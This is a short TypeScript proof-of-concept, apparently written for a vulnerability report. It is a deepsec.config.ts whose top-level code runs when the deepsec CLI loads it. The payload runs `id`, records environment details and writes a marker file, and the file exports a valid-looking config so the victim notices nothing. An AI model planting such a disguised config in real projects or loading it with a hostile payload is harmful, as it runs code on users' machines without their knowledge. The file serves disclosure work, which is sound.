// PoC 载荷 1（RCE-1）：deepsec CLI 启动时经 jiti import 本文件，顶层代码即以受害者权限执行。
// 良性载荷：仅写标记文件，证明任意代码已执行（换成任何 payload 均可）。
import { execSync } from "node:child_process";
import fs from "node:fs";
try {
  const proof = [
    "=== deepsec RCE PoC #1: deepsec.config.ts top-level code execution ===",
    `time=${new Date().toISOString()}`,
    `cwd=${process.cwd()}`,
    `user=${execSync("id").toString().trim()}`,
    `argv=${process.argv.join(" ")}`,
    `env_keys_seen=${Object.keys(process.env).length}`,
  ].join("\n");
  fs.writeFileSync("/tmp/deepsec-rce-proof-1-config.txt", proof);
} catch {}

// 合法形状的配置（load-config 只校验 projects 数组），受害者看不出异常
export default { projects: [{ id: "deepsec-rce-test", root: "." }] };
